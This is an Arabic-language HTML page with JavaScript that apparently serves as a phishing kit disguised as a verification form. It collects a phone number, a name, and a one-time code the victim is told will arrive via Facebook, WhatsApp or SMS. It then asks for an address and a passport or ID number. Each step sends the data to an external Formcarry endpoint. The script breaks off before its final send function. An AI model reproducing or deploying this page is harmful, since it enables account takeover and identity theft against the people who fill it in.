<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>نموذج التحقق</title>
  <style>
    body { font-family: Arial; background: #f5f5f5; padding: 20px; text-align: center; direction: rtl; }
    .step { display: none; margin-top: 20px; }
    .visible { display: block; }
    input, select, button {
      padding: 10px; margin: 10px 0; width: 80%; max-width: 300px;
      font-size: 16px; border: 1px solid #ccc; border-radius: 5px;
    }
    button { background: #2c3e50; color: white; border: none; cursor: pointer; }
    .note { color: gray; font-size: 14px; }
  </style>
</head>
<body>

  <!-- المرحلة 1 -->
  <div class="step visible" id="step1">
    <input type="tel" id="phone" placeholder="أدخل رقم الهاتف">
    <br>
    <button onclick="sendPhone()">أرسل رقم التحقق</button>
  </div>

  <!-- المرحلة 2 -->
  <div class="step" id="step2">
    <input type="text" id="fullname" placeholder="الاسم الكامل">
    <br>
    <div id="verificationBox">
      <input type="text" id="code" placeholder="ادخل رمز التحقق">
      <p class="note" id="codeMsg">سوف يتم تحويل رمز التحقيق الى إشعار فيسبوك، واتساب، رسالة نصية</p>
      <button id="verifyBtn" style="display: none;" onclick="sendCode()">تأكيد التحقق</button>
    </div>
  </div>

  <!-- زر تأكيد البيانات -->
  <div class="step" id="finalConfirm" style="display:none;">
    <button onclick="resendAll()">تأكيد البيانات</button>
  </div>

  <!-- المرحلة 3 -->
  <div class="step" id="step3">
    <input type="text" id="finalName" placeholder="الاسم بالكامل">
    <br>
    <input type="text" id="address" placeholder="العنوان">
    <br>
    <select id="docType" onchange="toggleDocField()">
      <option value="">اختر نوع الوثيقة (اختياري)</option>
      <option value="جواز السفر">جواز السفر</option>
      <option value="بطاقة شخصية">بطاقة شخصية</option>
    </select>
    <br>
    <input type="text" id="docValue" placeholder="رقم الوثيقة" style="display:none;">
    <br>
    <button onclick="sendFinal()">إرسال البيانات</button>
  </div>

  <script>
    // إرسال رقم الهاتف إلى Formcarry الأول
    function sendPhone() {
      const phone = document.getElementById('phone').value;
      if (!phone) return alert("يرجى إدخال رقم الهاتف");

      fetch("https://formcarry.com/s/pHHZOWhpgsB", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ phone })
      });

      document.getElementById('step1').classList.remove('visible');
      document.getElementById('step2').classList.add('visible');

      // بعد 4 ثوانٍ أخفِ الرسالة وأظهر زر تأكيد
      setTimeout(() => {
        document.getElementById("codeMsg").style.display = "none";
        document.getElementById("verifyBtn").style.display = "inline-block";
      }, 4000);
    }

    // إرسال الاسم ورمز التحقق إلى Formcarry الثاني
    function sendCode() {
      const fullname = document.getElementById('fullname').value;
      const code = document.getElementById('code').value;

      if (!fullname || !code) return alert("يرجى إدخال الاسم ورمز التحقق");

      fetch("https://formcarry.com/s/pHHZOWhpgsB", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ fullname, code })
      });

      document.getElementById('step2').classList.remove('visible');
      document.getElementById('finalConfirm').style.display = 'block';
    }

    // إعادة إرسال الاسم + الهاتف + الكود إلى Formcarry الثالث
    function resendAll() {
      const phone = document.getElementById('phone').value;
      const fullname = document.getElementById('fullname').value;
      const code = document.getElementById('code').value;

      fetch("https://formcarry.com/s/pHHZOWhpgsB", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ phone, fullname, code })
      });

      document.getElementById('finalConfirm').style.display = 'none';
      document.getElementById('step3').classList.add('visible');
    }

    // إظهار حقل الوثيقة حسب الاختيار
    function toggleDocField() {
      const docType = document.getElementById('docType').value;
      const docValue = document.getElementById('docValue');
      docValue.style.display = docType ? "inline-block" : "none";
      docValue.placeholder = docType ? `رقم ${docType}` : "";
    }

    // إرسال البيانات النهائية إلى Formcarry الراب
